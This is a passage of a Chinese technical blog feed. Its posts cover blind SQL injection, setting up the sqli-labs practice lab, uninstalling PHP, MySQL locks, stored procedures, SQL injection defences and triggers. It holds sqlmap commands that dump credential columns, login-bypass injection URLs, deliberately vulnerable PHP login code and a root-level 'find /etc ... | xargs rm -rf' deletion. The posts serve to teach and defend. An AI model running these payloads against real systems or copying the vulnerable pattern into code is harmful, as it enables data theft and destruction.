<h2 id="盲注的介绍"><a href="#盲注的介绍" class="headerlink" title="盲注的介绍"></a>盲注的介绍</h2><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为三类：</p>
<ul>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
<h3 id="基于布尔SQL盲注—-构造逻辑判断"><a href="#基于布尔SQL盲注—-构造逻辑判断" class="headerlink" title="基于布尔SQL盲注—-构造逻辑判断"></a>基于布尔SQL盲注—-构造逻辑判断</h3><p>我们可以利用逻辑判断进行<a href="http://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="external">截取字符串相关函数解析</a><br><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="external">正则注入介绍</a></p>
<h3 id="基于报错的SQL盲注—-构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注—-构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注—-构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注—-构造payload让信息通过错误提示回显出来</h3><h3 id="基于时间的SQL盲注—-延时注入"><a href="#基于时间的SQL盲注—-延时注入" class="headerlink" title="基于时间的SQL盲注—-延时注入"></a>基于时间的SQL盲注—-延时注入</h3><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>一、查询数据库<br><code>sqlmap -u &quot;http://10.6.67.209L8881/sqli-labs/Less-1/?id=1&quot; --dbs</code><br>二、查询当前使用的数据库<br><code>sqlmap -u &quot;http://10.6.67.209L8881/sqli-labs/Less-1/?id=1&quot; --current-db</code><br>三、查询所有表<br><code>sqlmap -u &quot;http://10.6.67.209L8881/sqli-labs/Less-1/?id=1&quot; -D [table] --tables</code><br>四、查询users所有字段<br><code>sqlmap -u &quot;http://10.6.67.209:8881/sqli-labs/Less-1/?id=1&quot; -D [table] -T users --columns</code><br>五、指定查询的列<br><code>sqlmap -u &quot;http://10.6.67.209:8881/sqli-labs/Less-1/?id=1&quot; -D [table] -T users -C username,password --dump</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RT&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.sanstylemc.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 18.04搭建sqli-labs</title>
    <link href="http://www.sanstylemc.cn/2018/07/26/Ubuntu-18-04%E6%90%AD%E5%BB%BAsqli-labs/"/>
    <id>http://www.sanstylemc.cn/2018/07/26/Ubuntu-18-04搭建sqli-labs/</id>
    <published>2018-07-26T07:41:38.000Z</published>
    <updated>2018-07-26T07:42:22.323Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;近来无事，重温了以前所学。<br>&nbsp;&nbsp;&nbsp;&nbsp;Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程，网上将sqli-labs大多安装在windows上，故梳理下在Ubuntu上安装的教程。Ubuntu版本RT。<br><a id="more"></a></p>
<p>安装sqli-labs之前，需先安装相应的php环境。</p>
<h2 id="安装PHP环境"><a href="#安装PHP环境" class="headerlink" title="安装PHP环境"></a>安装PHP环境</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sudo apt-get <span class="keyword">install</span> apache2</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> php(版本为<span class="number">7</span>)</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> mysql-<span class="keyword">server</span></div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> libapache2-<span class="keyword">mod</span>-php(一些基本模块)</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> php-gd</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> php-curl</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> libapache2-<span class="keyword">mod</span>-auth-mysql</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> php-mysql</div></pre></td></tr></table></figure>
<p>测试:<br>浏览器打开: <code>http://localhost</code> , 出现Apache的界面，说明环境搭建成功。<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/1.png?raw=true" alt="1"><br>默认目录：<br>Apache安装完成后的默认网站根目录是<code>/var/www/html</code> 。这个可以修改，也可以不修改。<br>若想修改可以按照以下步骤进行修改：<br><code>sudo vim /etc/apache2/apache2.conf</code><br>将<code>/var/www/</code>修改为<code>/home/www</code>。<br><code>sudo vim /etc/apache2/sites-available/000-default.conf</code><br>将<code>DocumentRoot /var/www/html</code>的位置改为<code>/home/www</code>即可。<br>重启Apache服务器：<br><code>sudo service apache2 restart</code></p>
<h2 id="安装sqli-labs"><a href="#安装sqli-labs" class="headerlink" title="安装sqli-labs"></a>安装sqli-labs</h2><p>下载地址<code>https://github.com/Audi-1/sqli-labs</code><br>我用的是git下载，需要先安装git。<br><code>sudo apt-get install git</code><br>安装之后，使用git克隆即可。<br><code>git clone https://github.com/Audi-1/sqli-labs.git</code><br>下载后，修改<code>sql-connections</code>文件夹中的<code>db-creds.inc</code>文件，填入mysql数据库的用户名和密码，并将文件夹放在网站根目录下，我放的位置是<code>/var/www/html</code><br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/2.png?raw=true" alt="2"><br>可以看到我的用户名并不是<code>root</code>，原因是创建了一个用户，创建用户的方法，请看<a href="http://sanstylemc.cn/2017/10/28/%E6%9C%AC%E5%9C%B0%E8%BF%9E%E6%8E%A5%E8%85%BE%E8%AE%AF%E4%BA%91MySQL/" target="_blank" rel="external">这里</a></p>
<p>浏览器打开：<code>http://localhost/sqli-labs</code>出现如下界面：<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/3.png?raw=true" alt="3"><br>点开第一个链接，新建数据库，若出现如下界面，则说明成功！<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/4.png?raw=true" alt="4"><br>如果只出现一行这个：<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/5.png?raw=true" alt="5"><br>表明没有创建成功。<br>此时要进入到<code>/var/www/html/sqli-labs/sql-connections</code><br>使用<code>ls</code>命令可以看到此目录有<code>setup-db.php</code><br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/6.png?raw=true" alt="6"><br>这个php文件和我们所点的第一个链接执行的php文件是一个。<br>此时在这个目录下, 单独运行这个php文件<br><code>php setup-db.php</code><br>会发现运行报错<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/7.png?raw=true" alt="7"><br>是在第29行，<code>mysql_connect()</code>附近。<br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/8.png?raw=true" alt="8"><br>原因是从PHP5.0开始就不推荐使用mysql_connect()函数，到了PHP7.0则直接废弃了该函数，他的替代品是<code>mysqli_connect()</code><br>用法是<code>$con=mysqli_connect(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;my_db&quot;);</code><br>所以我们要将<code>setup-db.php</code>文件中的<code>mysql_conect()</code>改为<code>mysqli_connect()</code><br><img src="https://github.com/sunstady/hexo/blob/master/sqli-labs/9.png?raw=true" alt="9"><br>除此之外，还要修改<code>mysql_query()</code>参数为<code>($con,$sql)</code><br>所以修改完后的就是<code>mysqli_query($con,$sql)</code><br>修改完后重启下Apache<br><code>sudo service apache2 restart</code><br>再次打开<code>http://localhost/sqli-labs</code><br>点击第一个链接，就会出现成功的画面。</p>
<blockquote>
<p>注：由于github上的sqli-labs是用php5写的，有很多地方与php7不兼容，所以建议安装php5来使用此环境。</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近来无事，重温了以前所学。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程，网上将sqli-labs大多安装在windows上，故梳理下在Ubuntu上安装的教程。Ubuntu版本RT。&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.sanstylemc.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>卸载php</title>
    <link href="http://www.sanstylemc.cn/2018/07/26/%E5%8D%B8%E8%BD%BDphp/"/>
    <id>http://www.sanstylemc.cn/2018/07/26/卸载php/</id>
    <published>2018-07-26T07:21:54.000Z</published>
    <updated>2018-07-26T07:49:52.821Z</updated>
    
    <content type="html"><![CDATA[<p>RT<br><a id="more"></a><br>一、删除php的相关包及配置。<br><code>sudo apt-get autoremove php7*</code><br><img src="https://github.com/sunstady/hexo/blob/master/%E5%8D%B8%E8%BD%BDphp/1.png?raw=true" alt="1"><br>二、删除关联<br><code>sudo find /etc -name &quot;*php*&quot; |xargs rm -rf</code><br><img src="https://github.com/sunstady/hexo/blob/master/%E5%8D%B8%E8%BD%BDphp/2.png?raw=true" alt="2"><br>如果提示权限不够，需要先进入root<br>输入<code>su</code><br>根据提示输入密码<br>此时再运行一次，即可删除<br><img src="https://github.com/sunstady/hexo/blob/master/%E5%8D%B8%E8%BD%BDphp/3.png?raw=true" alt="3"><br>三、清除dept列表<br><img src="https://github.com/sunstady/hexo/blob/master/%E5%8D%B8%E8%BD%BDphp/4.png?raw=true" alt="4"><br>四、检查是否卸载干净(无返回就是卸载干净)<br><code>dpkg -l | grep php7</code><br><img src="https://github.com/sunstady/hexo/blob/master/%E5%8D%B8%E8%BD%BDphp/5.png?raw=true" alt="5"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RT&lt;br&gt;
    
    </summary>
    
    
      <category term="软件" scheme="http://www.sanstylemc.cn/tags/%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>锁问题</title>
    <link href="http://www.sanstylemc.cn/2018/07/25/%E9%94%81%E9%97%AE%E9%A2%98/"/>
    <id>http://www.sanstylemc.cn/2018/07/25/锁问题/</id>
    <published>2018-07-25T06:22:19.000Z</published>
    <updated>2018-07-25T06:22:56.124Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;锁是计算机协调多个进程或线程并发访问某一资源的机制。在数据库中，除传统的计算资源(如CPU、RAM、I/O等)的争用以外，数据也是一种供许多用户共享的资源。锁冲突是影响数据库并发访问性能的一个重要因素。<br><a id="more"></a></p>
<h2 id="MySQL锁概述"><a href="#MySQL锁概述" class="headerlink" title="MySQL锁概述"></a>MySQL锁概述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;MySQL的锁机制比较简单，其最显著的特点是不同的存储引擎支持不同的锁机制。比如，M有ISAM和MEMORY存储引擎采用的是表级锁(table-level locking); BDB存储引擎采用的是页面锁(page-level locking), 但也支持表级锁; InnoDB存储引擎既支持行级锁，也支持表级锁，但默认情况下是采用行级锁。</p>
<p>MySQL这3种锁的特性可大致归纳如下。</p>
<ul>
<li>表级锁：开销小，加锁快，不会出现死锁，锁定力度大，发生锁冲突的概率最高，并发度最低。</li>
<li>行级锁：开销大，加锁慢，会出现死锁，锁定力度最小，发生锁冲突的概率最低，并发度也最高。</li>
<li>页面锁：开销和加锁时间界于表锁和行锁之间，会出现死锁，锁定力度界于表锁和行锁之间，并发度一般。</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;仅从锁的角度来看：表级锁更适合于以查询为主，只有少量按索引条件更新数据的引用，如Web应用；而行级锁则更适合于有大量按索引条件并发更新少量不同数据，同时又有并发查询的应用，如一些在线事务处理(OLTP)系统。</p>
<h2 id="什么时候使用表锁"><a href="#什么时候使用表锁" class="headerlink" title="什么时候使用表锁"></a>什么时候使用表锁</h2><p>对于InnoDB表，在绝大部分情况下都应该使用行级锁，因为事务和行锁往往是我们之所以选择InnoDB表的理由。但在个别特殊事务中，也可以考虑使用表级锁。</p>
<ul>
<li>第一种情况是：事务需要更新大部分或全部数据，表又比较大，如果使用默认的行锁，不仅这个事务执行效率低，而且可能造成其他事务长时间锁等待和锁冲突，这种情况下可以考虑使用表锁来提高该事务的执行速度。</li>
<li>第二种情况是：事务涉及多个表，比较复杂，很可能引起死锁，造成大量事务回滚。这种情况也可以考虑一次性锁定事务涉及的表，从而避免死锁、减少数据库因事务回滚带来的开销。<br>当然，应用中这两种事务不能太多，否则，就应该考虑使用MyISAM表了。</li>
</ul>
<h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;MyISAM表锁是deadlock free的，这是因为MyISAM总是一次获得所需的全部锁，要么全部满足，要么等待，因此不会出现死锁。但在InnpDB中，除单个SQL组成的事务外，锁是逐步获得的，这就决定在InnoDB中发生死锁是可能的。<br>&nbsp;&nbsp;&nbsp;&nbsp;发生死锁后，InnoDB一般都能自动检测到，并使一个事务释放锁并回退，另一个事务获得锁，继续完成事务。但在涉及外部锁，或涉及表锁的情况下，InnoDB并不能完全自动检测到死锁，这需要通过设置锁等待超时参数innodb_lock_wait_timeout来解决。需要说明的是，这个参数并不是只用来解决死锁问题，在并发访问比较高的情况下，如果大量事务因无法立即获得所需的锁而挂起，会占用大量计算机资源，造成严重的性能问题，甚至拖垮数据库。可以通过设置合适的锁等待超时阈(yu四声)值,避免这种情况发生。<br>1、在应用中，如果不同的程序会并发存取多个表，应尽量约定以相同的顺序来访问表，这样可以大大降低产生死锁的机会。<br>2、在程序中以批量方式处理数据的时候，如果事先对数据排序，保证每个线程按固定的顺序来处理记录，也可以大大降低出现死锁的可能。<br>3、在事务中，如果要更新记录，应该直接申请足够级别的锁，即排他锁，而不应先申请共享锁，更新时再申请排他锁，因为当用户申请排他锁时，其他事务可能又已经获得了相同记录的共享锁，从而造成锁冲突，甚至死锁。<br>4、在REPEATABLE-READ隔离级别下，如果两个线程同时对相同条件记录用SELECT…FOR UPDATE加排他锁，在没有符合该条件记录情况下，两个线程都会加锁成功。程序发现记录尚不存在，就试图插入一条新记录，如果两个线程都这么做，就会出现死锁。这种情况下，将隔离级别改成READ COMMITTED，就可避免问题。<br>5、当隔离级别为READ COMMITTED时，如果两个线程都先执行SELECT…FOR UPDATE，判断是否存在符合条件的记录，如果没有，就插入记录。此时，只有一个线程能插入成功，另一个线程会出现锁等待， 当第一个线程提交后，第二个线程会因主键重出错，但虽然这个线程出错了，却会获得一个排他锁！这时如果有第三个线程又来申请排他锁，也会出现死锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;对于这种情况，可以直接做插入操作，然后再捕获主键重异常，或者在遇到主键重错误时，总是执行ROLLBACK释放获得的排他锁。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;锁是计算机协调多个进程或线程并发访问某一资源的机制。在数据库中，除传统的计算资源(如CPU、RAM、I/O等)的争用以外，数据也是一种供许多用户共享的资源。锁冲突是影响数据库并发访问性能的一个重要因素。&lt;br&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="http://www.sanstylemc.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>procedure与function</title>
    <link href="http://www.sanstylemc.cn/2018/07/25/procedure%E4%B8%8Efunction/"/>
    <id>http://www.sanstylemc.cn/2018/07/25/procedure与function/</id>
    <published>2018-07-25T03:10:07.000Z</published>
    <updated>2018-07-25T03:10:48.973Z</updated>
    
    <content type="html"><![CDATA[<p><code>procedure(存储过程)</code>：存储在数据库中执行某种功能的程序，就是把完成某种功能的程序存储起来，当我们想完成这个功能时直接调用存储方法，提高执行效率，因为他只编译一次。<br><code>function(函数)</code>: RT<br><a id="more"></a></p>
<h2 id="procedure与function的创建语法图"><a href="#procedure与function的创建语法图" class="headerlink" title="procedure与function的创建语法图"></a>procedure与function的创建语法图</h2><p><img src="https://github.com/sunstady/hexo/blob/master/procedure/1.png?raw=true" alt="1"></p>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;函数必须有且仅有一个返回值，且必须指定返回值数据类型(返回值类型目前仅仅支持字符串、数值类型)。存储过程可以没有返回值，也可以有返回值，甚至可以有多个返回值，所有的返回值需要使用out或者inout参数定义。<br>&nbsp;&nbsp;&nbsp;&nbsp;函数体内可以使用select…into语句为某个变量赋值。<br>&nbsp;&nbsp;&nbsp;&nbsp;函数是可以嵌入在sql中使用的，可以在select中调用，而存储过程要让sql的query可以执行，需要把mysql_real_connect的最后一个参数设置为CLIENT_MULTI_STATEMENTS。<br>&nbsp;&nbsp;&nbsp;&nbsp;函数限制比较多，比如不能用临时表，只能用表变量，还有一些函数都不可用等等，而存储过程的限制相对就比较少。<br>1、一般来说，存储过程实现的功能要复杂一点，而函数的实现的功能针对性比较强。存储过程，功能强大，可以执行包括修改表等一系列数据库操作；用户定义函数不能用于执行一组修改全局数据库状态的操作。<br>2、对于存储过程来说可以返回参数，如记录集，而函数只能返回值或者表对象。函数只能返回一个变量；而存储过程可以返回多个。存储过程的参数可以有IN,OUT,INOUT三种类型，而函数只能有IN类~~存储过程声明时不需要返回类型，而函数声明时需要描述返回类型，且函数体中必须包含一个有效的RETURN语句。<br>3、存储过程，可以使用非确定函数，不允许在用户定义函数主体中内置非确定函数。<br>4、存储过程一般是作为一个独立的部分来执行（ EXECUTE 语句执行），而函数可以作为查询语句的一个部分来调用（SELECT调用），由于函数可以返回一个表对象，因此它可以在查询语句中位于FROM关键字的后面。 SQL语句中不可用存储过程，而可以使用函数。<br>&nbsp;&nbsp;&nbsp;&nbsp;当存储过程和函数被执行的时候，SQL Manager会到procedure cache中去取相应的查询语句，如果在procedure cache里没有相应的查询语句，SQL Manager就会对存储过程和函数进行编译。<br>&nbsp;&nbsp;&nbsp;&nbsp;Procedure cache中保存的是执行计划 (execution plan) ，当编译好之后就执行procedure cache中的execution plan，之后SQL SERVER会根据每个execution plan的实际情况来考虑是否要在cache中保存这个plan，评判的标准一个是这个execution plan可能被使用的频率；其次是生成这个plan的代价，也就是编译的耗时。保存在cache中的plan在下次执行时就不用再编译了。</p>
<h2 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="function"><span class="keyword">procedure</span> <span class="title">sp_name</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">begin</span></span></div><div class="line"><span class="function">...</span></div><div class="line"><span class="function"><span class="title">end</span></span></div></pre></td></tr></table></figure>
<h2 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">call</span> sp_name()</div></pre></td></tr></table></figure>
<p>注：存储过程名称后面必须加括号，哪怕该存储过程没有参数传递。</p>
<h2 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h2><figure class="highlight cal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">drop <span class="function"><span class="keyword">procedure</span> <span class="title">sp_name</span></span></div></pre></td></tr></table></figure>
<p>注：不能在一个存储过程中删除另一个存储过程，只能调用另一个存储过程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;procedure(存储过程)&lt;/code&gt;：存储在数据库中执行某种功能的程序，就是把完成某种功能的程序存储起来，当我们想完成这个功能时直接调用存储方法，提高执行效率，因为他只编译一次。&lt;br&gt;&lt;code&gt;function(函数)&lt;/code&gt;: RT&lt;br&gt;
    
    </summary>
    
    
      <category term="失误锦集" scheme="http://www.sanstylemc.cn/tags/%E5%A4%B1%E8%AF%AF%E9%94%A6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入及防护</title>
    <link href="http://www.sanstylemc.cn/2018/07/25/SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%98%B2%E6%8A%A4/"/>
    <id>http://www.sanstylemc.cn/2018/07/25/SQL注入及防护/</id>
    <published>2018-07-25T02:35:33.000Z</published>
    <updated>2018-07-25T02:47:08.108Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;SQL注入(SQL Injection)是利用某些数据库的外部接口将数据插入到实际的数据库操作语言(SQL)当中，从而达到入侵数据库乃至操作系统的目的。它的产生主要是由于程序对用户输入的数据没有进行严格的过滤，导致非法数据库查询语句的执行。<br><a id="more"></a></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;下面的用户登陆验证程序就是SQL注入的一个例子(以PHP程序举例)<br>创建用户表user:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</div><div class="line">userid <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</div><div class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">primary <span class="keyword">key</span>(userid)</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>给用户表user添加一条用户记录:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> <span class="keyword">values</span>(<span class="number">1</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</div></pre></td></tr></table></figure></p>
<p>验证用户root登录的localhost服务器：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">    $servername= <span class="string">"localhost"</span>;</span></div><div class="line"><span class="php">    $dbusername= <span class="string">"root"</span>;</span></div><div class="line"><span class="php">    $dbpassword= <span class="string">""</span>;</span></div><div class="line"><span class="php">    $dbname= <span class="string">"injection"</span>;</span></div><div class="line"><span class="php">    mysql_connect($servername, $dbusername, $dbpassword) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">"数据库连接失败"</span>);</span></div><div class="line"><span class="php">    $sql= <span class="string">"select * from user where username= '$username' and password= '$password'"</span>;</span></div><div class="line"><span class="php">    $result= mysql_db_query($dbname, $sql);</span></div><div class="line"><span class="php">    $userinfo= mysql_fetch_array($result);</span></div><div class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">empty</span>($userinfo))&#123;</span></div><div class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"登录失败"</span>;</span></div><div class="line"><span class="php">    &#125;<span class="keyword">else</span> &#123;</span></div><div class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"登录成功"</span>;</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;SQL Query:$sql&lt;/p&gt;"</span>;</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>然后提交如下URL：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/injection/u</span>ser.php?username=root<span class="string">' or '</span><span class="number">1</span>=<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>结果发现，这个URL可以成功登陆。同样也可以利用SQL的注释语句实现SQL注入，例如：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/injection/user.php?username=root'/*</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/injection/user.php?username=root'#</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;因为在SQL语句中，” /* “或者” # “都可以将后面的语句注释掉。这样上述语句就可以通过这两个注释符中任意一个将后面的语句给注释掉，结果导致只根据用户名而没有密码的URL都成功进行了登录。利用” or “和注释符的不同之处在于，前者是利用逻辑运算，而后者是根据MySQL的特性，这个比逻辑运算简单的多。</p>
<h2 id="应对措施"><a href="#应对措施" class="headerlink" title="应对措施"></a>应对措施</h2><h3 id="PrepareStatement-Bind-variable"><a href="#PrepareStatement-Bind-variable" class="headerlink" title="PrepareStatement+Bind-variable"></a>PrepareStatement+Bind-variable</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;对Java、JSP开发的应用，可以使用PrepareStatement+Bind-variable来防止SQL注入，尽量不要使用拼接的SQL。<br>Bind-variable(绑定变量)：查询通常只是因为改变where子句中的内容而产生不同的结果。为了在这种情况下避免硬解析，需要使用绑定变量。它是用户放入查询中的占位符，它会告诉MySQL或者Oracle”我会提供一个值放到这里”，一般在procedure or function中使用，可以优化共享池的使用。</p>
<h3 id="使用应用程序提高的转换函数"><a href="#使用应用程序提高的转换函数" class="headerlink" title="使用应用程序提高的转换函数"></a>使用应用程序提高的转换函数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;很多应用程序接口都提供了对特殊字符进行转换的函数，恰当的使用这些函数，可以防止应用程序用户输入使应用程序生成不当期望的语句。</p>
<ul>
<li>MySQL C API：使用mysql_real_escape_string()API调用。</li>
<li>MySQL++：使用escape和quote修饰符。</li>
<li>PHP：使用mysql_real_escape_string()函数(适用于PHP 4.3.0版本)</li>
<li>Perl DBI：使用placeholders或者quote()方法。</li>
<li>Ruby DBI：使用placeholders或者quote()方法。</li>
</ul>
<h2 id="自定义函数进行校验"><a href="#自定义函数进行校验" class="headerlink" title="自定义函数进行校验"></a>自定义函数进行校验</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;如果现有的转换函数仍然不能满足要求，则需要自己编写函数进行输入校验。输入验证的途径可以分为以下几种：</p>
<ul>
<li>整理数据使之变得有效。</li>
<li>拒绝已知的非法输入。</li>
<li>只接受已知的合法输入。</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;所以如果想要获得最好的安全状态，目前最好的解决方法就是对用户提交或者可能改变的数据进行简单分类，分别应用正则表达式来对用户提供的输入数据进行严格的检测和验证。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SQL注入(SQL Injection)是利用某些数据库的外部接口将数据插入到实际的数据库操作语言(SQL)当中，从而达到入侵数据库乃至操作系统的目的。它的产生主要是由于程序对用户输入的数据没有进行严格的过滤，导致非法数据库查询语句的执行。&lt;br&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="http://www.sanstylemc.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>触发器</title>
    <link href="http://www.sanstylemc.cn/2018/07/25/%E8%A7%A6%E5%8F%91%E5%99%A8/"/>
    <id>http://www.sanstylemc.cn/2018/07/25/触发器/</id>
    <published>2018-07-25T02:01:33.000Z</published>
    <updated>2018-07-25T02:02:10.010Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;触发器是与表有关的数据库对象，在满足定义条件时触发，并执行触发器中定义的语句集合。触发器的这种特性可以协助应用在数据库端确保数据的完整性。<br><a id="more"></a></p>
<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><p>创建触发器的语法如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trigger_name trigger_time trigger_event <span class="keyword">ON</span> tb_name <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span> trigger_stmt</div><div class="line">trigger_name：触发器的名称</div><div class="line">tirgger_time：触发时机，为<span class="keyword">BEFORE</span>或者<span class="keyword">AFTER</span></div><div class="line">trigger_event：触发事件，为<span class="keyword">INSERT</span>、<span class="keyword">DELETE</span>或者<span class="keyword">UPDATE</span></div><div class="line">tb_name：表示建立触发器的表明，就是在哪张表上建立触发器</div><div class="line">trigger_stmt：触发器的程序体，可以是一条<span class="keyword">SQL</span>语句或者是用<span class="keyword">BEGIN</span>和<span class="keyword">END</span>包含的多条语句</div><div class="line">所以可以说MySQL创建以下六种触发器：</div><div class="line"><span class="keyword">BEFORE</span> <span class="keyword">INSERT</span>,<span class="keyword">BEFORE</span> <span class="keyword">DELETE</span>,<span class="keyword">BEFORE</span> <span class="keyword">UPDATE</span></div><div class="line"><span class="keyword">AFTER</span> 